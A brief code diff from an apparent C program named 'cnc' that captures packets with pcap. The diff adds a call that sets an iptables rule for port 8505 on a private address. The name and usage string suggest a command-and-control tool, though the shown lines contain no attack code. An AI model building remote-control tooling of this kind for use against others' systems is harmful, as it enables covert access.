@@ -18,6 +18,7 @@ int main(int argc, char **argv){
 
     CreateFilter(fil, filter);
     printf("\n%s", filter);
+    iptables("8505","192.168.0.1","tcp");
     /*
     if(argc < 2){
         printf("Usage ./cnc [command]\n");
@@ -34,6 +35,7 @@ int main(int argc, char **argv){
     exit(1);
     return 0;
 }
+
 
 int Packetcapture(){
     char errorbuffer[PCAP_ERRBUF_SIZE];
